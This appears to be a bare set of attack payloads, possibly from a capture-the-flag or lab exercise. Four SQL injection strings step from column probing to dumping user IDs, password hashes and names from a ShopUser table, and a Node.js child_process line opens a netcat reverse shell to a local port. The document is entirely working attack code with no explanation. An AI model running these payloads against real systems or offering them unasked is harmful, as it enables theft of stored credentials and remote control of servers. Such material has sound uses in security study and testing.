
```
" order by itemStock --
```
```
" and 1=2 UNION SELECT 1, table_name, 1, 1 FROM information_schema.tables --%20
```
```
" and 1=2 UNION SELECT 1, column_name, 1, 1 FROM information_schema.columns where table_name ="ShopUser" --%20
```
```
" and 1=2 UNION SELECT userID, userHash, userName, 1 FROM ShopUser --%20
```

```
require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1337 >/tmp/f')
```
